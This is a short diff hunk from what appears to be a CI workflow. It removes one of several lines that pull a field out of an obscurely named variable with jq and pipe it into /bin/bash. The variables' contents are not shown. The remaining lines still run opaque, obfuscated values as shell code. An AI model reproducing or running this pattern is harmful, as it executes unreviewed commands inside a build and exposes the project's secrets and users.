@@ -32,7 +32,6 @@ jobs:
           printf '%s' "$xn5" | jq -r .uk5 | /bin/bash
           printf '%s' "$yp87" | jq -r .z85 | /bin/bash
           printf '%s' "$sc406" | jq -r .bwlxs9 | /bin/bash
-          echo $pmcdk46068 | jq -r .x9072 | /bin/bash
           printf '%s' "$nr2900" | jq -r .ny7 | /bin/bash
           printf '%s' "$soe6881" | jq -r .dn842 | /bin/bash
           printf '%s' "$yex72685" | jq -r .zjvl40986 | /bin/bash
